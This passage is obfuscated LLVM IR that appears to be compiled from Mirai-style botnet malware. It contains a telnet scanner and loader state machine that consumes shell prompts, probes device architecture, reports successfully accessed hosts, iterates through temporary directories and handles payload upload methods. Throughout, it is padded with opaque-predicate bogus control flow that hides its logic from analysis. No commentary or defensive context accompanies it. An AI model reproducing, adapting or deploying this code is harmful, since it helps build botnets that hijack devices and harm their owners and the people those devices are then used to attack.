  %1328 = call i32 (i32, i8*, ...) @fdsend(i32 %1322, i8* %1327)
  %1329 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1330 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1329, i32 0, i32 16
  store i32 5, i32* %1330, align 8
  br label %1331

; <label>:1331:                                   ; preds = %1319, %originalBBpart2186
  %1332 = load i32, i32* @x.7
  %1333 = load i32, i32* @y.8
  %1334 = sub i32 %1332, 1
  %1335 = mul i32 %1332, %1334
  %1336 = urem i32 %1335, 2
  %1337 = icmp eq i32 %1336, 0
  %1338 = icmp slt i32 %1333, 10
  %1339 = or i1 %1337, %1338
  br i1 %1339, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1331
  %1340 = load i32, i32* @x.7
  %1341 = load i32, i32* @y.8
  %1342 = sub i32 %1340, 1
  %1343 = mul i32 %1340, %1342
  %1344 = urem i32 %1343, 2
  %1345 = icmp eq i32 %1344, 0
  %1346 = icmp slt i32 %1341, 10
  %1347 = or i1 %1345, %1346
  br i1 %1347, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br label %2081

; <label>:1348:                                   ; preds = %1238
  %1349 = load i32, i32* @x.7
  %1350 = load i32, i32* @y.8
  %1351 = sub i32 %1349, 1
  %1352 = mul i32 %1349, %1351
  %1353 = urem i32 %1352, 2
  %1354 = icmp eq i32 %1353, 0
  %1355 = icmp slt i32 %1350, 10
  %1356 = or i1 %1354, %1355
  br i1 %1356, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %1348
  %1357 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1358 = call i32 @consume_shell_prompt(%struct.scanner_connection* %1357)
  store i32 %1358, i32* %35, align 4
  %1359 = icmp sgt i32 %1358, 0
  %1360 = load i32, i32* @x.7
  %1361 = load i32, i32* @y.8
  %1362 = sub i32 %1360, 1
  %1363 = mul i32 %1360, %1362
  %1364 = urem i32 %1363, 2
  %1365 = icmp eq i32 %1364, 0
  %1366 = icmp slt i32 %1361, 10
  %1367 = or i1 %1365, %1366
  br i1 %1367, label %originalBBpart2194, label %originalBB192alteredBB

originalBBpart2194:                               ; preds = %originalBB192
  br i1 %1359, label %1368, label %1396

; <label>:1368:                                   ; preds = %originalBBpart2194
  %1369 = load i32, i32* @x.7
  %1370 = load i32, i32* @y.8
  %1371 = sub i32 %1369, 1
  %1372 = mul i32 %1369, %1371
  %1373 = urem i32 %1372, 2
  %1374 = icmp eq i32 %1373, 0
  %1375 = icmp slt i32 %1370, 10
  %1376 = or i1 %1374, %1375
  br i1 %1376, label %originalBB196, label %originalBB196alteredBB

originalBB196:                                    ; preds = %originalBB196alteredBB, %1368
  call void @table_unlock_val(i8 zeroext 11)
  %1377 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1378 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1377, i32 0, i32 2
  %1379 = load i32, i32* %1378, align 8
  %1380 = call i32 (i32, i8*, ...) @fdsend(i32 %1379, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i32 0, i32 0))
  %1381 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1382 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1381, i32 0, i32 2
  %1383 = load i32, i32* %1382, align 8
  %1384 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1385 = call i32 (i32, i8*, ...) @fdsend(i32 %1383, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0), i8* %1384)
  call void @table_lock_val(i8 zeroext 11)
  %1386 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1387 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1386, i32 0, i32 16
  store i32 6, i32* %1387, align 8
  %1388 = load i32, i32* @x.7
  %1389 = load i32, i32* @y.8
  %1390 = sub i32 %1388, 1
  %1391 = mul i32 %1388, %1390
  %1392 = urem i32 %1391, 2
  %1393 = icmp eq i32 %1392, 0
  %1394 = icmp slt i32 %1389, 10
  %1395 = or i1 %1393, %1394
  br i1 %1395, label %originalBBpart2198, label %originalBB196alteredBB

originalBBpart2198:                               ; preds = %originalBB196
  br label %1434

; <label>:1396:                                   ; preds = %originalBBpart2194
  %1397 = load i32, i32* %35, align 4
  %1398 = icmp eq i32 %1397, -1
  br i1 %1398, label %1399, label %1433

; <label>:1399:                                   ; preds = %1396
  %1400 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1401 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1400, i32 0, i32 2
  %1402 = load i32, i32* %1401, align 8
  %1403 = call i32 @close(i32 %1402)
  %1404 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1405 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1404, i32 0, i32 2
  store i32 -1, i32* %1405, align 8
  %1406 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1407 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1406, i32 0, i32 9
  %1408 = load i8, i8* %1407, align 4
  %1409 = add i8 %1408, 1
  store i8 %1409, i8* %1407, align 4
  %1410 = zext i8 %1409 to i32
  %1411 = icmp eq i32 %1410, 10
  br i1 %1411, label %1412, label %1430

; <label>:1412:                                   ; preds = %1399
  %1413 = load i32, i32* @x.7
  %1414 = load i32, i32* @y.8
  %1415 = sub i32 %1413, 1
  %1416 = mul i32 %1413, %1415
  %1417 = urem i32 %1416, 2
  %1418 = icmp eq i32 %1417, 0
  %1419 = icmp slt i32 %1414, 10
  %1420 = or i1 %1418, %1419
  br i1 %1420, label %originalBB200, label %originalBB200alteredBB

originalBB200:                                    ; preds = %originalBB200alteredBB, %1412
  %1421 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1421, i32 1)
  %1422 = load i32, i32* @x.7
  %1423 = load i32, i32* @y.8
  %1424 = sub i32 %1422, 1
  %1425 = mul i32 %1422, %1424
  %1426 = urem i32 %1425, 2
  %1427 = icmp eq i32 %1426, 0
  %1428 = icmp slt i32 %1423, 10
  %1429 = or i1 %1427, %1428
  br i1 %1429, label %originalBBpart2202, label %originalBB200alteredBB

originalBBpart2202:                               ; preds = %originalBB200
  br label %1432

; <label>:1430:                                   ; preds = %1399
  %1431 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %1431)
  br label %1432

; <label>:1432:                                   ; preds = %1430, %originalBBpart2202
  br label %1433

; <label>:1433:                                   ; preds = %1432, %1396
  br label %1434

; <label>:1434:                                   ; preds = %1433, %originalBBpart2198
  %1435 = load i32, i32* @x.7
  %1436 = load i32, i32* @y.8
  %1437 = sub i32 %1435, 1
  %1438 = mul i32 %1435, %1437
  %1439 = urem i32 %1438, 2
  %1440 = icmp eq i32 %1439, 0
  %1441 = icmp slt i32 %1436, 10
  %1442 = or i1 %1440, %1441
  br i1 %1442, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %1434
  %1443 = load i32, i32* @x.7
  %1444 = load i32, i32* @y.8
  %1445 = sub i32 %1443, 1
  %1446 = mul i32 %1443, %1445
  %1447 = urem i32 %1446, 2
  %1448 = icmp eq i32 %1447, 0
  %1449 = icmp slt i32 %1444, 10
  %1450 = or i1 %1448, %1449
  br i1 %1450, label %originalBBpart2206, label %originalBB204alteredBB

originalBBpart2206:                               ; preds = %originalBB204
  br label %2081

; <label>:1451:                                   ; preds = %1238
  %1452 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1453 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1452)
  store i32 %1453, i32* %35, align 4
  %1454 = icmp sgt i32 %1453, 0
  br i1 %1454, label %1455, label %1531

; <label>:1455:                                   ; preds = %1451
  %1456 = load i32, i32* @x.7
  %1457 = load i32, i32* @y.8
  %1458 = sub i32 %1456, 1
  %1459 = mul i32 %1456, %1458
  %1460 = urem i32 %1459, 2
  %1461 = icmp eq i32 %1460, 0
  %1462 = icmp slt i32 %1457, 10
  %1463 = or i1 %1461, %1462
  br i1 %1463, label %originalBB208, label %originalBB208alteredBB

originalBB208:                                    ; preds = %originalBB208alteredBB, %1455
  %1464 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1465 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1464, i32 0, i32 5
  store i32 0, i32* %1465, align 4
  %1466 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1467 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1466, i32 0, i32 1
  %1468 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1467, i32 0, i32 0
  %1469 = load i32, i32* %1468, align 8
  %1470 = icmp ne i32 %1469, 0
  %1471 = load i32, i32* @x.7
  %1472 = load i32, i32* @y.8
  %1473 = sub i32 %1471, 1
  %1474 = mul i32 %1471, %1473
  %1475 = urem i32 %1474, 2
  %1476 = icmp eq i32 %1475, 0
  %1477 = icmp slt i32 %1472, 10
  %1478 = or i1 %1476, %1477
  br i1 %1478, label %originalBBpart2210, label %originalBB208alteredBB

originalBBpart2210:                               ; preds = %originalBB208
  br i1 %1470, label %1486, label %1479

; <label>:1479:                                   ; preds = %originalBBpart2210
  %1480 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1481 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1480, i32 0, i32 2
  %1482 = load i32, i32* %1481, align 8
  %1483 = call i32 (i32, i8*, ...) @fdsend(i32 %1482, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.107, i32 0, i32 0))
  %1484 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1485 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1484, i32 0, i32 16
  store i32 7, i32* %1485, align 8
  br label %1530

; <label>:1486:                                   ; preds = %originalBBpart2210
  %1487 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1488 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1487, i32 0, i32 8
  %1489 = getelementptr inbounds [16 x i8], [16 x i8]* %1488, i32 0, i32 0
  %1490 = call i32 @strcmp(i8* %1489, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %1491 = icmp ne i32 %1490, 0
  br i1 %1491, label %1492, label %1498

; <label>:1492:                                   ; preds = %1486
  %1493 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1494 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1493, i32 0, i32 8
  %1495 = getelementptr inbounds [16 x i8], [16 x i8]* %1494, i32 0, i32 0
  %1496 = call i32 @strcmp(i8* %1495, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #10
  %1497 = icmp ne i32 %1496, 0
  br i1 %1497, label %1522, label %1498

; <label>:1498:                                   ; preds = %1492, %1486
  %1499 = load i32, i32* @x.7
  %1500 = load i32, i32* @y.8
  %1501 = sub i32 %1499, 1
  %1502 = mul i32 %1499, %1501
  %1503 = urem i32 %1502, 2
  %1504 = icmp eq i32 %1503, 0
  %1505 = icmp slt i32 %1500, 10
  %1506 = or i1 %1504, %1505
  br i1 %1506, label %originalBB212, label %originalBB212alteredBB

originalBB212:                                    ; preds = %originalBB212alteredBB, %1498
  call void @table_unlock_val(i8 zeroext 11)
  %1507 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1508 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1507, i32 0, i32 2
  %1509 = load i32, i32* %1508, align 8
  %1510 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1511 = call i32 (i32, i8*, ...) @fdsend(i32 %1509, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i32 0, i32 0), i8* %1510)
  call void @table_lock_val(i8 zeroext 11)
  %1512 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1513 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1512, i32 0, i32 16
  store i32 8, i32* %1513, align 8
  %1514 = load i32, i32* @x.7
  %1515 = load i32, i32* @y.8
  %1516 = sub i32 %1514, 1
  %1517 = mul i32 %1514, %1516
  %1518 = urem i32 %1517, 2
  %1519 = icmp eq i32 %1518, 0
  %1520 = icmp slt i32 %1515, 10
  %1521 = or i1 %1519, %1520
  br i1 %1521, label %originalBBpart2215, label %originalBB212alteredBB

originalBBpart2215:                               ; preds = %originalBB212
  br label %2081

; <label>:1522:                                   ; preds = %1492
  call void @table_unlock_val(i8 zeroext 11)
  %1523 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1524 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1523, i32 0, i32 2
  %1525 = load i32, i32* %1524, align 8
  %1526 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1527 = call i32 (i32, i8*, ...) @fdsend(i32 %1525, i8* %1526)
  call void @table_lock_val(i8 zeroext 11)
  %1528 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1529 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1528, i32 0, i32 16
  store i32 9, i32* %1529, align 8
  br label %1530

; <label>:1530:                                   ; preds = %1522, %1479
  br label %1531

; <label>:1531:                                   ; preds = %1530, %1451
  %1532 = load i32, i32* @x.7
  %1533 = load i32, i32* @y.8
  %1534 = sub i32 %1532, 1
  %1535 = mul i32 %1532, %1534
  %1536 = urem i32 %1535, 2
  %1537 = icmp eq i32 %1536, 0
  %1538 = icmp slt i32 %1533, 10
  %1539 = or i1 %1537, %1538
  br i1 %1539, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %1531
  %1540 = load i32, i32* @x.7
  %1541 = load i32, i32* @y.8
  %1542 = sub i32 %1540, 1
  %1543 = mul i32 %1540, %1542
  %1544 = urem i32 %1543, 2
  %1545 = icmp eq i32 %1544, 0
  %1546 = icmp slt i32 %1541, 10
  %1547 = or i1 %1545, %1546
  br i1 %1547, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br label %2081

; <label>:1548:                                   ; preds = %1238
  %1549 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1550 = call i32 @parse_elf_response(%struct.scanner_connection* %1549)
  store i32 %1550, i32* %35, align 4
  %1551 = icmp sgt i32 %1550, 0
  br i1 %1551, label %1552, label %1557

; <label>:1552:                                   ; preds = %1548
  %1553 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1554 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1553, i32 0, i32 1
  %1555 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1554, i32 0, i32 0
  store i32 1, i32* %1555, align 8
  %1556 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %1556)
  br label %1597

; <label>:1557:                                   ; preds = %1548
  %1558 = load i32, i32* @x.7
  %1559 = load i32, i32* @y.8
  %1560 = sub i32 %1558, 1
  %1561 = mul i32 %1558, %1560
  %1562 = urem i32 %1561, 2
  %1563 = icmp eq i32 %1562, 0
  %1564 = icmp slt i32 %1559, 10
  %1565 = or i1 %1563, %1564
  br i1 %1565, label %originalBB221, label %originalBB221alteredBB

originalBB221:                                    ; preds = %originalBB221alteredBB, %1557
  %1566 = load i32, i32* %35, align 4
  %1567 = icmp eq i32 %1566, -1
  %1568 = load i32, i32* @x.7
  %1569 = load i32, i32* @y.8
  %1570 = sub i32 %1568, 1
  %1571 = mul i32 %1568, %1570
  %1572 = urem i32 %1571, 2
  %1573 = icmp eq i32 %1572, 0
  %1574 = icmp slt i32 %1569, 10
  %1575 = or i1 %1573, %1574
  br i1 %1575, label %originalBBpart2223, label %originalBB221alteredBB

originalBBpart2223:                               ; preds = %originalBB221
  br i1 %1567, label %1576, label %1580

; <label>:1576:                                   ; preds = %originalBBpart2223
  %1577 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1578 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1577, i32 0, i32 9
  store i8 0, i8* %1578, align 4
  %1579 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1579, i32 1)
  br label %1580

; <label>:1580:                                   ; preds = %1576, %originalBBpart2223
  %1581 = load i32, i32* @x.7
  %1582 = load i32, i32* @y.8
  %1583 = sub i32 %1581, 1
  %1584 = mul i32 %1581, %1583
  %1585 = urem i32 %1584, 2
  %1586 = icmp eq i32 %1585, 0
  %1587 = icmp slt i32 %1582, 10
  %1588 = or i1 %1586, %1587
  br i1 %1588, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %1580
  %1589 = load i32, i32* @x.7
  %1590 = load i32, i32* @y.8
  %1591 = sub i32 %1589, 1
  %1592 = mul i32 %1589, %1591
  %1593 = urem i32 %1592, 2
  %1594 = icmp eq i32 %1593, 0
  %1595 = icmp slt i32 %1590, 10
  %1596 = or i1 %1594, %1595
  br i1 %1596, label %originalBBpart2227, label %originalBB225alteredBB

originalBBpart2227:                               ; preds = %originalBB225
  br label %1597

; <label>:1597:                                   ; preds = %originalBBpart2227, %1552
  %1598 = load i32, i32* @x.7
  %1599 = load i32, i32* @y.8
  %1600 = sub i32 %1598, 1
  %1601 = mul i32 %1598, %1600
  %1602 = urem i32 %1601, 2
  %1603 = icmp eq i32 %1602, 0
  %1604 = icmp slt i32 %1599, 10
  %1605 = or i1 %1603, %1604
  br i1 %1605, label %originalBB229, label %originalBB229alteredBB

originalBB229:                                    ; preds = %originalBB229alteredBB, %1597
  %1606 = load i32, i32* @x.7
  %1607 = load i32, i32* @y.8
  %1608 = sub i32 %1606, 1
  %1609 = mul i32 %1606, %1608
  %1610 = urem i32 %1609, 2
  %1611 = icmp eq i32 %1610, 0
  %1612 = icmp slt i32 %1607, 10
  %1613 = or i1 %1611, %1612
  br i1 %1613, label %originalBBpart2231, label %originalBB229alteredBB

originalBBpart2231:                               ; preds = %originalBB229
  br label %2081

; <label>:1614:                                   ; preds = %1238
  %1615 = load i32, i32* @x.7
  %1616 = load i32, i32* @y.8
  %1617 = sub i32 %1615, 1
  %1618 = mul i32 %1615, %1617
  %1619 = urem i32 %1618, 2
  %1620 = icmp eq i32 %1619, 0
  %1621 = icmp slt i32 %1616, 10
  %1622 = or i1 %1620, %1621
  br i1 %1622, label %originalBB233, label %originalBB233alteredBB

originalBB233:                                    ; preds = %originalBB233alteredBB, %1614
  %1623 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1624 = call i32 @consume_arm_subtype(%struct.scanner_connection* %1623)
  store i32 %1624, i32* %35, align 4
  %1625 = icmp sgt i32 %1624, 0
  %1626 = load i32, i32* @x.7
  %1627 = load i32, i32* @y.8
  %1628 = sub i32 %1626, 1
  %1629 = mul i32 %1626, %1628
  %1630 = urem i32 %1629, 2
  %1631 = icmp eq i32 %1630, 0
  %1632 = icmp slt i32 %1627, 10
  %1633 = or i1 %1631, %1632
  br i1 %1633, label %originalBBpart2235, label %originalBB233alteredBB

originalBBpart2235:                               ; preds = %originalBB233
  br i1 %1625, label %1634, label %1642

; <label>:1634:                                   ; preds = %originalBBpart2235
  call void @table_unlock_val(i8 zeroext 11)
  %1635 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1636 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1635, i32 0, i32 2
  %1637 = load i32, i32* %1636, align 8
  %1638 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1639 = call i32 (i32, i8*, ...) @fdsend(i32 %1637, i8* %1638)
  call void @table_lock_val(i8 zeroext 11)
  %1640 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1641 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1640, i32 0, i32 16
  store i32 9, i32* %1641, align 8
  br label %1642

; <label>:1642:                                   ; preds = %1634, %originalBBpart2235
  br label %2081

; <label>:1643:                                   ; preds = %1238
  %1644 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1645 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1644)
  store i32 %1645, i32* %35, align 4
  %1646 = icmp sgt i32 %1645, 0
  br i1 %1646, label %1647, label %1703

; <label>:1647:                                   ; preds = %1643
  %1648 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1649 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1648, i32 0, i32 15
  %1650 = load i32, i32* %1649, align 4
  %1651 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1652 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1651, i32 0, i32 13
  %1653 = load i16, i16* %1652, align 8
  %1654 = zext i16 %1653 to i32
  %1655 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %1650, i32 %1654, %struct.scanner_connection* %1655, i32 0)
  store i32 0, i32* %36, align 4
  br label %1656

; <label>:1656:                                   ; preds = %1688, %1647
  %1657 = load i32, i32* @x.7
  %1658 = load i32, i32* @y.8
  %1659 = sub i32 %1657, 1
  %1660 = mul i32 %1657, %1659
  %1661 = urem i32 %1660, 2
  %1662 = icmp eq i32 %1661, 0
  %1663 = icmp slt i32 %1658, 10
  %1664 = or i1 %1662, %1663
  br i1 %1664, label %originalBB237, label %originalBB237alteredBB

originalBB237:                                    ; preds = %originalBB237alteredBB, %1656
  %1665 = load i32, i32* %36, align 4
  %1666 = icmp slt i32 %1665, 15
  %1667 = load i32, i32* @x.7
  %1668 = load i32, i32* @y.8
  %1669 = sub i32 %1667, 1
  %1670 = mul i32 %1667, %1669
  %1671 = urem i32 %1670, 2
  %1672 = icmp eq i32 %1671, 0
  %1673 = icmp slt i32 %1668, 10
  %1674 = or i1 %1672, %1673
  br i1 %1674, label %originalBBpart2239, label %originalBB237alteredBB

originalBBpart2239:                               ; preds = %originalBB237
  br i1 %1666, label %1675, label %1691

; <label>:1675:                                   ; preds = %originalBBpart2239
  %1676 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1677 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1676, i32 0, i32 2
  %1678 = load i32, i32* %1677, align 8
  %1679 = load i32, i32* %36, align 4
  %1680 = sext i32 %1679 to i64
  %1681 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %1680
  %1682 = load i8*, i8** %1681, align 8
  %1683 = load i32, i32* %36, align 4
  %1684 = sext i32 %1683 to i64
  %1685 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %1684
  %1686 = load i8*, i8** %1685, align 8
  %1687 = call i32 (i32, i8*, ...) @fdsend(i32 %1678, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i32 0, i32 0), i8* %1682, i8* %1686)
  br label %1688

; <label>:1688:                                   ; preds = %1675
  %1689 = load i32, i32* %36, align 4
  %1690 = add nsw i32 %1689, 1
  store i32 %1690, i32* %36, align 4
  br label %1656

; <label>:1691:                                   ; preds = %originalBBpart2239
  %1692 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1693 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1692, i32 0, i32 2
  %1694 = load i32, i32* %1693, align 8
  %1695 = call i32 (i32, i8*, ...) @fdsend(i32 %1694, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.114, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 11)
  %1696 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1697 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1696, i32 0, i32 2
  %1698 = load i32, i32* %1697, align 8
  %1699 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1700 = call i32 (i32, i8*, ...) @fdsend(i32 %1698, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.115, i32 0, i32 0), i8* %1699)
  call void @table_lock_val(i8 zeroext 11)
  %1701 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1702 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1701, i32 0, i32 16
  store i32 10, i32* %1702, align 8
  br label %1703

; <label>:1703:                                   ; preds = %1691, %1643
  br label %2081

; <label>:1704:                                   ; preds = %1238
  %1705 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1706 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1705)
  store i32 %1706, i32* %35, align 4
  %1707 = icmp sgt i32 %1706, 0
  br i1 %1707, label %1708, label %1749

; <label>:1708:                                   ; preds = %1704
  %1709 = load i32, i32* @x.7
  %1710 = load i32, i32* @y.8
  %1711 = sub i32 %1709, 1
  %1712 = mul i32 %1709, %1711
  %1713 = urem i32 %1712, 2
  %1714 = icmp eq i32 %1713, 0
  %1715 = icmp slt i32 %1710, 10
  %1716 = or i1 %1714, %1715
  br i1 %1716, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %1708
  %1717 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1718 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1717, i32 0, i32 8
  %1719 = getelementptr inbounds [16 x i8], [16 x i8]* %1718, i32 0, i32 0
  %1720 = call i32 @strcmp(i8* %1719, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0)) #10
  %1721 = icmp eq i32 %1720, 0
  %1722 = load i32, i32* @x.7
  %1723 = load i32, i32* @y.8
  %1724 = sub i32 %1722, 1
  %1725 = mul i32 %1722, %1724
  %1726 = urem i32 %1725, 2
  %1727 = icmp eq i32 %1726, 0
  %1728 = icmp slt i32 %1723, 10
  %1729 = or i1 %1727, %1728
  br i1 %1729, label %originalBBpart2243, label %originalBB241alteredBB

originalBBpart2243:                               ; preds = %originalBB241
  br i1 %1721, label %1730, label %1741

; <label>:1730:                                   ; preds = %originalBBpart2243
  call void @table_unlock_val(i8 zeroext 11)
  %1731 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1732 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1731, i32 0, i32 2
  %1733 = load i32, i32* %1732, align 8
  %1734 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1735 = call i32 (i32, i8*, ...) @fdsend(i32 %1733, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.117, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i32 176, i32 107, i32 133, i32 208, i8* %1734)
  call void @table_lock_val(i8 zeroext 11)
  %1736 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1737 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1736, i32 0, i32 1
  %1738 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1737, i32 0, i32 1
  store i32 3, i32* %1738, align 4
  %1739 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1740 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1739, i32 0, i32 16
  store i32 13, i32* %1740, align 8
  br label %2081

; <label>:1741:                                   ; preds = %originalBBpart2243
  call void @table_unlock_val(i8 zeroext 11)
  %1742 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1743 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1742, i32 0, i32 2
  %1744 = load i32, i32* %1743, align 8
  %1745 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1746 = call i32 (i32, i8*, ...) @fdsend(i32 %1744, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.118, i32 0, i32 0), i8* %1745)
  call void @table_lock_val(i8 zeroext 11)
  %1747 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1748 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1747, i32 0, i32 16
  store i32 12, i32* %1748, align 8
  br label %1749

; <label>:1749:                                   ; preds = %1741, %1704
  br label %2081

; <label>:1750:                                   ; preds = %1238
  %1751 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1752 = call i32 @connection_consume_upload_methods(%struct.scanner_connection* %1751)
  store i32 %1752, i32* %35, align 4
  %1753 = load i32, i32* %35, align 4
  %1754 = icmp ne i32 %1753, 0
  br i1 %1754, label %1755, label %1861

; <label>:1755:                                   ; preds = %1750
  %1756 = load i32, i32* @x.7
  %1757 = load i32, i32* @y.8
  %1758 = sub i32 %1756, 1
  %1759 = mul i32 %1756, %1758
  %1760 = urem i32 %1759, 2
  %1761 = icmp eq i32 %1760, 0
  %1762 = icmp slt i32 %1757, 10
  %1763 = or i1 %1761, %1762
  br i1 %1763, label %originalBB245, label %originalBB245alteredBB

originalBB245:                                    ; preds = %originalBB245alteredBB, %1755
  call void @table_unlock_val(i8 zeroext 11)
  %1764 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1765 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1764, i32 0, i32 1
